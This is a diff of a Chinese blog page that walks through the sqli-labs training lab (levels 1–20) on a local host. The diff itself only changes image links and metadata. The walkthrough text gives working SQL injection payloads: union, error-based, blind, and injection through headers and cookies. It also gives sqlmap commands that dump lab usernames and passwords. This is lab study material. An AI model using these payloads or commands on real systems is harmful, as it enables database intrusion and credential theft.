@@ -205,7 +205,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208205152774.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208205152774.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -358,7 +358,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:
-                    2021-02-28
+                    2021-03-19
                 </div>
                 
 
@@ -404,7 +404,7 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order
 <p>发现3时不报错,而4时报错，所以字段数是3。<br>接下来用联合查询判断显示位。首先要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。我使用的是-1。</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;-1&#39; union select 1,2,3 --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208194701808.png" alt="image-20210208194701808"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194701808.png" alt="image-20210208194701808"></p>
 <p>显示位是2,3。所以可以在 2,3位置进行sql注入</p>
 <p>这里涉及到几个函数</p>
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/94594406">mysql中concat()，concat_ws()，group_concat()的用法</a></p>
@@ -413,7 +413,7 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1&#39; order
 爆字段:http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+
 爆值:http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;100&#39; union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+ 加个换行符要好看点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208194722570.png" alt="image-20210208194722570"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194722570.png" alt="image-20210208194722570"></p>
 <p><strong>sqlmap</strong></p>
 <p>为了方便截图,后面加个输出参数为0</p>
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 --technique UE --dbms mysql –batch –v 0
@@ -423,7 +423,7 @@ sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D
 sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-1&#x2F;?id&#x3D;1 --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0 #看用户名和密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>结果:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208194906554.png" alt="image-20210208194906554"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194906554.png" alt="image-20210208194906554"></p>
 <h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p> <strong>手动</strong></p>
 <p>第二个和第一个差不多,但是是数值型注入,把1后面的引号去掉就行</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D;1 --+
@@ -434,7 +434,7 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-2&#x2F;?id&#x3D;1 and 1&#x3D
 <p>套less1的语句就行</p>
 <h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p> <strong>手动</strong></p>
 <p>先传id=1 好家伙</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208194806106.png" alt="image-20210208194806106"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194806106.png" alt="image-20210208194806106"></p>
 <p>要构造闭合,上一篇slq注入的文章写过</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) and 1&#x3D;1 --+
 http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) and 1&#x3D;2 --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -444,9 +444,9 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) and 
 <pre class="line-numbers language-none"><code class="language-none">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) --technique UE --dbms mysql -D security -T users -C username,password --dump --batch -v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>第一个还是可以</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208194824485.png" alt="image-20210208194824485"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208194824485.png" alt="image-20210208194824485"></p>
 <h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p><strong>手动</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195001271.png" alt="image-20210208195001271"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195001271.png" alt="image-20210208195001271"></p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-4&#x2F;?id&#x3D;1&quot;
 和上面的类似,只需要闭合&quot;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
@@ -458,36 +458,36 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-3&#x2F;?id&#x3D;1&#39;) and 
 
 <p><strong>前面四题其实差不多,只是闭合符号的区别</strong></p>
 <h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>这题没有显位,所以判断是布尔盲注,时间盲注,或者是报错注入</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195017876.png" alt="image-20210208195017876"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195017876.png" alt="image-20210208195017876"></p>
 <p><strong>手动</strong></p>
 <p>通过一个left函数来判断,一个一个去试太费时间了,可以用burp suite爆破</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and left((select database()),2)&#x3D;&quot;se&quot; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200311822.png" alt="image-20210208200311822"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200311822.png" alt="image-20210208200311822"></p>
 <p>后面的就和前面差不多了</p>
 <p><strong>sqlmap</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">看下有哪些数据库
 python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql --dbs --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195053128.png" alt="image-20210208195053128"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195053128.png" alt="image-20210208195053128"></p>
 <pre class="line-numbers language-none"><code class="language-none">查看security数据库的表
 python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql -D security --tables --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195747622.png" alt="image-20210208195747622"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195747622.png" alt="image-20210208195747622"></p>
 <pre class="line-numbers language-none"><code class="language-none">查看字段
 python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql -D security -T users --columns --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195649270.png" alt="image-20210208195649270"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195649270.png" alt="image-20210208195649270"></p>
 <pre class="line-numbers language-none"><code class="language-none">查看用户名和密码
  python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-5&#x2F;?id&#x3D;1 --technique B --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195813166.png" alt="image-20210208195813166"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195813166.png" alt="image-20210208195813166"></p>
 <h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p>这题和上面less5差不多，就是闭合符号不一样，把单引号改成双引号就可以了</p>
 <h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><strong>手动</strong></p>
 <p>先确定是如何闭合的，如下</p>
 <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-7?id&#x3D;1&#39;)) --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195934527.png" alt="image-20210208195934527"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195934527.png" alt="image-20210208195934527"></p>
 <p>根据提示，目测是对数据库文件进行操作，上传一个一句话木马试试(因为我是装在自己的电脑上的所以知道绝对路径)</p>
 <p><strong>sqlmap</strong></p>
 <p>布尔盲注直接跑</p>
@@ -519,7 +519,7 @@ http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1&#39;)) an
 <p><strong>sqlmap</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-10&#x2F;?id&#x3D;1 --technique T --dbms mysql -D security -T users -C username,password --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208195951851.png" alt="image-20210208195951851"></p>
+<h2 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h2><p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208195951851.png" alt="image-20210208195951851"></p>
 <p>从这以后就全部变成post注入了</p>
 <p><strong>手动</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">username部分
@@ -531,10 +531,10 @@ username&#x3D;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62
 password可以随便输,因为后台已经注释掉了
 SELECT username, password FROM users WHERE username&#x3D;&#39;1&#39; union select 1,group_concat(username,0x3a,password,0x3c2f62723e) from security.users#&#39; and password&#x3D;&#39;$passwd&#39; LIMIT 0,1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200012353.png" alt="image-20210208200012353"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200012353.png" alt="image-20210208200012353"></p>
 <p><strong>sqlmap</strong></p>
 <p>先buspsuite抓包，看看data数据的格式，然后再拿sqlmap跑就可以了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200030999.png" alt="image-20210208200030999"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200030999.png" alt="image-20210208200030999"></p>
 <pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-11&#x2F; --data &quot;uname&#x3D;admin &amp;passwd&#x3D;admin &amp;submit&#x3D;Submit&quot; --dbms mysql -D security -T users --threads 5 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h2><p>不断尝试几次时候发现，这题和less11一模一样，只是闭合方式变了，变成了”）</p>
@@ -547,16 +547,16 @@ username&#x3D;1&#39;) and extractvalue(1,concat(1,(select (table_name) from info
 username&#x3D;1&#39;) and extractvalue(1,concat(1,(select (column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; limit 0,1)))#
 username&#x3D;1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,password) from security.users limit 1,1)))#<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200352121.png" alt="image-20210208200352121"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200352121.png" alt="image-20210208200352121"></p>
 <p><strong>sqlmap</strong></p>
 <p>因为之前已经抓过包,post请求应该是一样的,所以和命令和第十一题是一样</p>
 <h2 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h2><p>和上一题一样，只是闭合变成了“</p>
 <h2 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h2><p><strong>手动</strong></p>
 <p>这题不能用报错注入，试试其他的吧</p>
 <p>先试试数据库的长度</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200413051.png" alt="image-20210208200413051"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200413051.png" alt="image-20210208200413051"></p>
 <p>依旧使用left函数来判断</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200429516.png" alt="image-20210208200429516"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200429516.png" alt="image-20210208200429516"></p>
 <p>然后就是一个一个去试啦，也可以借助一些脚本，或者是burpsuite</p>
 <p><strong>sqlmap</strong></p>
 <p>然它自己去测吧，从结果来看，可以指定使用布尔盲注或者是时间盲注，这样子跑的会快一些</p>
@@ -569,7 +569,7 @@ username&#x3D;1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,p
 <p>查看post内容，发现是在passwd处</p>
 <p>我的理解是接收到用户POST提交的uname和passwd后，根据uname查询数据库的username和password，若uname存在则用passwd替换password，若不存在则显示slap1.jpg</p>
 <p>所以注入的时候要在这里，用户名的话就用admin吧</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200502414.png" alt="image-20210208200502414"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200502414.png" alt="image-20210208200502414"></p>
 <p>需要用到的是updatexml函数</p>
 <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;admin&amp;passwd&#x3D;123123&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 3,1)),1)#&amp;sumit&#x3D;Submit
 接下来的和前面差不多<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -583,30 +583,30 @@ username&#x3D;1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,p
 <p>登录失败只会显示ip地址,登录成功会显示user agent</p>
 <p>随后发现username和password都被转义了,构造不了闭合条件</p>
 <p>猜测可能可以通过user agent来注入,看了下源码,确实如此</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200520106.png" alt="image-20210208200520106"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200520106.png" alt="image-20210208200520106"></p>
 <p>谷歌的hackbar不知道为什么有点问题</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200534798.png" alt="image-20210208200534798"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200534798.png" alt="image-20210208200534798"></p>
 <p>直接用burpsuite试试</p>
 <p>payload为</p>
 <pre class="line-numbers language-none"><code class="language-none">&#39; or updatexml(1,concat(0x7e,(database())),1) or &#39;1&#39; &#x3D; &#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>可以看到已经爆出来了,接下来就是常规操作啦</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200642152.png" alt="image-20210208200642152"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200642152.png" alt="image-20210208200642152"></p>
 <p><strong>sqlmap</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level&#x3D;4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h2><p><strong>手动</strong></p>
 <p>输入正确会显示Referer,错误没有显示,这题基本上就是Referer这里存在注入</p>
 <p>和18题一样,只是注入点不一样,用上一题的payload就行了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200709726.png" alt="image-20210208200709726"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200709726.png" alt="image-20210208200709726"></p>
 <p><strong>sqlmap</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -r 抓包保存的文件路径 --tech E --dbms mysql -D security -T users --threads 5 --level&#x3D;4 --dump --batch v 0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h2 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h2><p><strong>手动</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200722575.png" alt="image-20210208200722575"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200722575.png" alt="image-20210208200722575"></p>
 <p>基本上就是cookie注入了</p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200801021.png" alt="image-20210208200801021"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208200817248.png" alt="image-20210208200817248"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200801021.png" alt="image-20210208200801021"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208200817248.png" alt="image-20210208200817248"></p>
 <p><strong>sqlmap</strong></p>
 <pre class="line-numbers language-none"><code class="language-none">❯ python sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs&#x2F;Less-20&#x2F;&quot; --cookie&#x3D;&quot;uname&#x3D;admin*&quot;--dbms&#x3D;MySQL --random-agent --flush-session --technique&#x3D;B -v 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -731,12 +731,12 @@ username&#x3D;1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,p
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/lou-dong/wen-jian-shang-chuan-lou-dong/">
+                <a href="/2020/ba-chang/upload-labs/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/image-20210306203157463.png" class="responsive-img" alt="文件上传漏洞">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/image-20210306203157463.png" class="responsive-img" alt="upload-labs">
                         
-                        <span class="card-title">文件上传漏洞</span>
+                        <span class="card-title">upload-labs</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -753,8 +753,8 @@ username&#x3D;1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,p
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E6%BC%8F%E6%B4%9E/" class="post-category">
-                                    漏洞
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
                                 </a>
                             
                             
@@ -782,7 +782,7 @@ username&#x3D;1&#39;) and extractvalue(1,concat(1,(select concat(username,0x3a,p
                 <a href="/2020/lou-dong/sql-zhu-ru/">
                     <div class="card-image">
                         
-                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/picgo/imgimage-20210208205152774.png" class="responsive-img" alt="sql注入原理及sqlmap的使用">
+                        <img src="https://cdn.jsdelivr.net/gh/anwarnu/img/imgimage-20210208205152774.png" class="responsive-img" alt="sql注入原理及sqlmap的使用">
                         
                         <span class="card-title">sql注入原理及sqlmap的使用</span>
                     </div>
